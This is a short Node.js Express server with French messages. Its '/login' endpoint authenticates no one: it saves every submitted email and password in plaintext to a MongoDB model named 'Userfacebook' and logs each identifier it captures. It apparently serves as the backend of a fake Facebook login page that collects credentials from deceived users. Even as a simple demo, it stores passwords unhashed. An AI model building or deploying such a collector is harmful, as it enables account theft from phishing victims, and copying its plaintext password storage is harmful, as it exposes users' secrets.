const express = require("express")
const mongoose = require("mongoose")
const cors = require("cors")
const app = express()
const port = 3000
const { Userfacebook } = require("./model")
const connection = require("./connection")
connection();
app.use(express.json())
app.use(cors())

app.post("/login", async (req, res) => {
    try {
        const { email, password } = req.body || {};

        // Validation minimale
        if (!email || !password) {
            return res.status(400).send({ message: 'Email et mot de passe requis' });
        }

        

        const utilisateur = new Userfacebook({ email, password });
        await utilisateur.save();
        console.log("le numero",email,"est connect")
        return res.status(201).send({ message: 'utilisateur créé avec succès' });
    } catch (error) {
       return res.status(500).send({ message: 'erreur lors de la création de l\'utilisateur', error });
        }
        
    
});

app.listen(port, () => {
    console.log("le serveur a demarré sur le port " + port)
})
